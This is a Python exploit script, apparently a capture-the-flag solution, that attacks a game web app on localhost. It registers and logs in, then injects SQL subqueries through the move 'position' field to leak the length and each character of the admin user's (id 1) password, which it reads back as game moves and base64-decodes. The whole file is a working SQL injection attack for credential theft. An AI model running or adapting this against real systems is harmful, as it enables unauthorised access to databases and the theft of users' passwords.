from random import randint
import requests
import base64

s = requests.Session()
TARGET = 'http://localhost:5000'

NUM = randint(0, 1024)
LOGIN = f'neptunianxxx{NUM}'
PASSWORD = f'neptunianpwdxxx{NUM}'


def request(endpoint, data, method='POST'):

    url = f'{TARGET}{endpoint}'
    print(f'==> REQUEST to {url}')
    print(data)
    print()

    if method == 'POST':
        response = s.post(url, data=data)
    else:
        response = s.get(url)

    print(f'RESPONSE: {response.status_code}')

    print(response.text)

    return response

def register():
    data = {
        'username': LOGIN,
        'password': PASSWORD,
    }

    return request('/register', data)

def login():
    data = {
        'username': LOGIN,
        'password': PASSWORD,
    }
    return request('/login', data)

def newgame():
    data = {
        'None': 0
    }
    response = request('/newgame', data)
    return response.json()['game_key']

def get_my_moves(game_key):
    response = request(f'/game/{game_key}/info', data=None, method='GET')
    return response.json()['X']

def insert_pwd_pos(game_key, pwd_position):
    data = {
        'position': f'(select ord(substring(password, {pwd_position+1}, 1)) from users where id = 1)',
    }

    return request(f'/game/{game_key}/move', data=data)

def insert_pwd_size(game_key):
    data = {
        'position': f'(select length(password) from users where id = 1)',
    }

    request(f'/game/{game_key}/move', data=data)

    return int(get_my_moves(game_key)[0])

def brute_pwd(game_key, size):
    for pos in range(size):
        insert_pwd_pos(game_key, pos)

    return get_my_moves(game_key)

def get_encoded_password(game_key):
    size = insert_pwd_size(game_key)
    encoded = brute_pwd(game_key, size)

    result_str = ''
    for code in encoded[1:]:
        result_str += chr(code)

    return result_str

def crackit():
    register()
    login()
    game_key = newgame()
    enc_pwd = get_encoded_password(game_key)
    pwd = base64.b64decode(enc_pwd)

    print(pwd)

crackit()